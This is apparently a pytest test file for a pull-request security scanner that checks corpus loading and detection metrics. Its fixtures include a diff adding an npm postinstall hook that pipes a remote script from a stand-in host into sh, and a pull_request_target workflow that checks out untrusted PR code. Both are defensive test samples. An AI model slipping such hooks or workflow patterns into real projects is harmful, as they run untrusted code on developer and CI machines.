import json

import pytest

from pr_scanner.corpus import CorpusError, load_cases, run_corpus
from pr_scanner.engine import Engine
from pr_scanner.policy import Policy
from pr_scanner.rules import default_registry

NPM_BAD = """\
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
   "name": "x",
+  "postinstall": "curl -s https://example.invalid/x.sh | sh"
 }
"""

NPM_OK = """\
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
   "name": "x",
+  "version": "1.0.1"
 }
"""


def case(root, label, name, patch, **meta):
    d = root / label / name
    d.mkdir(parents=True)
    (d / "diff.patch").write_text(patch)
    (d / "meta.json").write_text(json.dumps({"description": name, **meta}))


@pytest.fixture
def engine():
    return Engine(default_registry())


def test_metrics_for_a_small_corpus(tmp_path, engine):
    case(tmp_path, "malicious", "hit", NPM_BAD, threat="T-D01", expect_outcome="block", expect_rules=["HOOK-NPM"])
    case(tmp_path, "malicious", "miss", NPM_OK, threat="T-D01", expect_outcome="block", expect_rules=["HOOK-NPM"])
    case(tmp_path, "benign", "fine", NPM_OK, expect_outcome="pass")
    case(tmp_path, "benign", "false-positive", NPM_BAD, expect_outcome="pass")

    report = run_corpus(load_cases(tmp_path), engine, Policy())

    assert report.malicious_total == 2 and report.malicious_detected == 1
    assert report.recall == 0.5
    assert report.benign_total == 2 and report.benign_blocked == 1
    assert report.block_fp_rate == 0.5
    assert [r.name for r in report.failures] == ["miss", "false-positive"]
    assert report.per_rule["HOOK-NPM"].true_positives == 1
    assert report.per_rule["HOOK-NPM"].false_positives == 1
    assert report.per_rule["HOOK-NPM"].precision == 0.5


def test_malicious_detected_requires_expected_rule(tmp_path, engine):
    case(tmp_path, "malicious", "wrong-rule", NPM_BAD, threat="T", expect_outcome="block", expect_rules=["HOOK-PYSETUP"])
    report = run_corpus(load_cases(tmp_path), engine, Policy())
    assert report.malicious_detected == 0


def test_unparseable_patch_is_a_failure_not_a_pass(tmp_path, engine):
    case(tmp_path, "benign", "garbage", "not a diff", expect_outcome="pass")
    report = run_corpus(load_cases(tmp_path), engine, Policy())
    assert report.benign_total == 1 and len(report.failures) == 1
    assert "parse" in report.failures[0].detail.lower()


def test_empty_corpus_has_no_recall_claim(tmp_path, engine):
    report = run_corpus(load_cases(tmp_path), engine, Policy())
    assert report.recall is None


@pytest.mark.parametrize(
    "meta",
    [
        {},  # missing description / expectations
        {"description": "x", "expect_outcome": "nonsense"},
    ],
)
def test_invalid_metadata_is_rejected(tmp_path, meta):
    d = tmp_path / "benign" / "bad"
    d.mkdir(parents=True)
    (d / "diff.patch").write_text(NPM_OK)
    (d / "meta.json").write_text(json.dumps(meta))
    with pytest.raises(CorpusError):
        load_cases(tmp_path)


def test_malicious_case_must_declare_threat_and_rules(tmp_path):
    case(tmp_path, "malicious", "no-threat", NPM_BAD, expect_outcome="block")
    with pytest.raises(CorpusError):
        load_cases(tmp_path)


def test_missing_patch_is_rejected(tmp_path):
    d = tmp_path / "benign" / "nopatch"
    d.mkdir(parents=True)
    (d / "meta.json").write_text(json.dumps({"description": "x", "expect_outcome": "pass"}))
    with pytest.raises(CorpusError):
        load_cases(tmp_path)


def test_unknown_label_directory_is_rejected(tmp_path):
    (tmp_path / "weird" / "c").mkdir(parents=True)
    with pytest.raises(CorpusError):
        load_cases(tmp_path)


WF_PATCH = """\
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,3 +5,4 @@
     steps:
       - uses: actions/checkout@v4
+        with: { ref: "${{ github.event.pull_request.head.sha }}" }
       - run: npm test
"""
WF_HEAD = (
    "on: pull_request_target\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n"
    "        with: { ref: \"${{ github.event.pull_request.head.sha }}\" }\n      - run: npm test\n"
)


def test_head_directory_supplies_full_file_content(tmp_path, engine):
    # the trigger is not in the diff; only the head/ copy of the file reveals it
    case(tmp_path, "malicious", "prt", WF_PATCH, threat="T-D03", expect_outcome="block", expect_rules=["CI-PRT"])
    head = tmp_path / "malicious" / "prt" / "head" / ".github" / "workflows"
    head.mkdir(parents=True)
    (head / "ci.yml").write_text(WF_HEAD)
    (c,) = load_cases(tmp_path)
    assert c.head_files == {".github/workflows/ci.yml": WF_HEAD}
    assert run_corpus([c], engine, Policy()).malicious_detected == 1


def test_without_head_content_the_same_diff_is_only_a_medium_warning(tmp_path, engine):
    case(tmp_path, "benign", "prt-no-head", WF_PATCH, expect_outcome="warn")
    report = run_corpus(load_cases(tmp_path), engine, Policy())
    assert report.results[0].outcome == "warn"
